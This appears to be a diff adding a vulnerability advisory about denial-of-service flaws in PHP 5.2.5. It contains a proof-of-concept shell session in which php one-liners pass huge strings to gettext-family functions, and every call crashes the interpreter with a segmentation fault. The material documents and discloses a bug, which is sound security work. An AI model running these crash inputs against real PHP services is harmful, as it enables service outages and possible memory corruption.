@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/26428/info
+
+PHP is prone to multiple denial-of-service vulnerabilities because it fails to perform adequate boundary checks on user-supplied input.
+
+Attackers can exploit these issues to cause denial-of-service conditions. Given the nature of these issues, attackers may also be able to execute arbitrary code, but this has not been confirmed.
+
+PHP 5.2.5 is vulnerable; other versions may also be affected. 
+
+Proof of concept example :
+
+root@unsafebox:/# uname -a
+Linux unsafebox 2.6.20-16-generic #2 SMP Sun Sep 23 19:50:39 UTC 2007 
+i686 GNU/Linux
+
+root@unsafebox:/# php -v
+PHP 5.2.5 (cli) (built: Nov 11 2007 07:56:04)
+Copyright (c) 1997-2007 The PHP Group
+Zend Engine v2.2.0, Copyright (c) 1998-2007 Zend Technologies
+
+root@unsafebox:/# php -r 'dgettext(str_repeat("A",8476509),"hi");'
+Erreur de segmentation (core dumped)
+
+root@unsafebox:/# php -r 
+'dcgettext(LC_CTYPE,str_repeat("A",8476509),"hi");'
+Erreur de segmentation (core dumped)
+
+root@unsafebox:/# php -r 
+'dngettext("hi",str_repeat("A",8476509),"hi",-1);'
+Erreur de segmentation (core dumped)
+
+root@unsafebox:/# php -r 'gettext(str_repeat("A",8476509));'
+Erreur de segmentation (core dumped)
+
+root@unsafebox:/# php -r 'ngettext(str_repeat("A",8476509),"hi",-1);'
+Erreur de segmentation (core dumped)
+
+root@unsafebox:/# php -r 
+'dcgettext(LC_CTYPE,str_repeat("A",8476509),"hi");'
+Erreur de segmentation (core dumped)
